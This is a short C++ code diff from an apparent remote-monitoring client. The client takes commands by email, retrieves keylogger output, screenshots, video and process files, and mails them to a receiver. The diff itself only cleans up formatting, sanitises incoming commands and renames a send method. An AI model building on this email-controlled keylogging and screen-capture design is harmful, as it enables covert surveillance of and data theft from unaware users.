@@ -103,7 +103,7 @@ void Client::GetCommand()
 
       switch (choice)
       {
-        case 0: // EXIT
+      case 0: // EXIT
         this->command = "EXIT";
         std::cout << "Exiting client...\n";
         break;
@@ -194,6 +194,9 @@ void Client::GetCommand()
       {
         std::cout << "Valid command received via email: " << this->command << std::endl;
         fromEmail = true;
+        this->command.erase(std::remove(this->command.begin(), this->command.end(), '\r'), this->command.end());
+        this->command.erase(std::remove(this->command.begin(), this->command.end(), '\n'), this->command.end());
+        this->command.erase(std::remove(this->command.begin(), this->command.end(), '\0'), this->command.end());
         return;
       }
       else
@@ -238,7 +241,7 @@ void Client::ProcessCommand()
     if (fromEmail)
     {
       GmailClient gmail;
-      gmail.SendEmailAttachment(receiver, "LATEST_VIDEO", "File: ", "../data/video/" + filename);
+      gmail.SendVideoThroughEmail(receiver, "../data/video/" + filename);
     }
   }
   else if (com == "GET_KEYLOGGER")
@@ -259,7 +262,7 @@ void Client::ProcessCommand()
       gmail.SendEmailAttachment(receiver, "PROCESS_FILE", "File: ", "../data/process/" + filename);
     }
   }
-  else if(com == "TAKE_SCREEN_SHOT")
+  else if (com == "TAKE_SCREEN_SHOT")
   {
     ReceiveFile("../data/screenshot");
     if (fromEmail)
